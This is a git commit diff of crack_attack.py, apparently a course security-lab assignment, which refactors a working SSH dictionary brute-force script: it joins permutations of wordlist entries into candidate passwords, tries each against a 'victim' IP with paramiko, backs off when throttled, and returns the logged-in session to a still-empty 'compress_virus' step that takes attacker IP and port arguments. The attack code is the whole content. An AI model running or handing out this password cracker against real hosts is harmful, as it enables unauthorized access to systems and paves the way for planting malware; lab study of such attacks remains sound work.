ed6e4dd1af85713965896d57ae19fae7d44b636b
dw1209 <daniel20001209@gmail.com>
2023-05-01 01:34:13 +0800

    remove get_possible_passwords() and rewrite crack_ssh_password()

--- crack_attack.py
+++ crack_attack.py
@@ -1,84 +1,83 @@
 #!/usr/bin/env python3
 
-from itertools import permutations
-import paramiko
-import socket
-import time
 import sys
+import time
+import socket
+import paramiko
+from itertools import permutations
 
-sys.tracebacklimit = 0 # disable traceback printing
+
+class colors:
+    CEND    = '\033[0m'
+    FAIL    = '\033[91m'
+    SUCCESS = '\033[92m'
+    WARNING = '\033[93m'
+    INFO    = '\033[94m'
+
+
+def disable_traceback_print():
+    sys.tracebacklimit = 0
+
 
 def get_parameters():
     if len(sys.argv) != 4:
-        print("usage: ./crack_attack <Victim IP> <Attacker IP> <Attacker port>")
+        print(f"usage: {__file__} <Victim IP> <Attacker IP> <Attacker port>")
         exit(-1)
-
-    return sys.argv[1 : ]
+    return sys.argv[1:]
 
 
 def get_words():
     with open("/home/csc2023/materials/victim.dat", "r") as file:
-    # with open("/home/csc2023/Documents/test.txt", "r") as file:
         dictionary = file.read().splitlines()
         return dictionary
 
 
-def get_possible_passwords(dictionary):
-    possible_passwords = []
-    for i in range (1, len(dictionary) + 1):        
-        for combination in list(permutations(dictionary, i)):
-            word = "".join(combination) 
-            possible_passwords.append(word)
-    # print(possible_passwords)
-    return possible_passwords
-
-
-def try_ssh_connect(victim_ip, possible_password):
+def try_ssh_connect(victim_ip, password):
     username = "csc2023"
-    client   = paramiko.SSHClient()                           # initialize SSH client
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # add to know hosts
+    client   = paramiko.SSHClient()                                 # initialize SSH client
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())    # add to know hosts
     try:
-        client.connect(hostname=victim_ip, username=username, password=possible_password, timeout=5)
+        client.connect(hostname=victim_ip, username=username, password=password, timeout=5)
     except socket.timeout: 
-        print(f"[!] Timeout: {victim_ip} is unreachable, password is {possible_password}")
+        print(f"{colors.FAIL}[!] Timeout: {victim_ip} is unreachable, password is {password}{colors.CEND}")
         return False
     except paramiko.ssh_exception.NoValidConnectionsError: 
-        print(f"[!] No valid connection: SSH connection cannot be established, password is {possible_password}")
+        print(f"{colors.FAIL}[!] No valid connection: SSH connection cannot be established, password is {password}{colors.CEND}")
         return False
     except paramiko.AuthenticationException:
-        print(f"[!] Incorrect password: {possible_password} is invalid for {username}")
-        return False    
-    except paramiko.ssh_exception.SSHException as ssh_ex:
-        print(f"[!] SSHException: {ssh_ex}")
-        print("[!] Quota exceed, retrying with delay...")
+        print(f"{colors.INFO}[!] Incorrect password: {password} is invalid for {username}{colors.CEND}")
+        return False
+    except paramiko.ssh_exception.SSHException as SSHException:
+        print(f"{colors.WARNING}[!] SSH Exception: {SSHException}{colors.CEND}")
+        print(f"{colors.WARNING}[!] Quota exceed, retrying with delay ...{colors.CEND}")
         time.sleep(10)
-        return(try_ssh_connect(victim_ip, possible_password))
+        return try_ssh_connect(victim_ip, password)
     else:
-        print(f"[!] Find password: The password of {username} is {possible_password}")
+        print(f"{colors.SUCCESS}[!] Correct password: The password of {username} is {password}{colors.CEND}")
         return client
 
 
-def crack_ssh_password(victim_ip, possible_passwords):
-    for possible_password in possible_passwords:
-        victim =  try_ssh_connect(victim_ip, possible_password)
-        if victim:
-            return victim
-    print("[!] Cannot find the password")
+def crack_ssh_password(victim_ip, dictionary):
+    for i in range (1, len(dictionary) + 1):
+        for combination in list(permutations(dictionary, i)):
+            password = "".join(combination)
+            victim = try_ssh_connect(victim_ip, password)
+            if victim: return victim
+    print(f"{colors.FAIL}[!] Cannot find the correct password{colors.CEND}")
     exit(-1)
 
 
 def compress_virus(victim):
     # stdin, stdout, stderr = victim.exec_command("ls -a")
     # print(stdout.read().decode())
-    print("Do task2")
+    pass
 
 
 def main():
+    disable_traceback_print()
     victim_ip, attacker_ip, attacker_port = get_parameters()
     dictionary = get_words()
-    possible_passwords = get_possible_passwords(dictionary)
-    # possible_passwords = ["csc2023"]
-    victim = crack_ssh_password(victim_ip, possible_passwords)
+    victim = crack_ssh_password(victim_ip, dictionary)
     compress_virus(victim)
     victim.close()
         
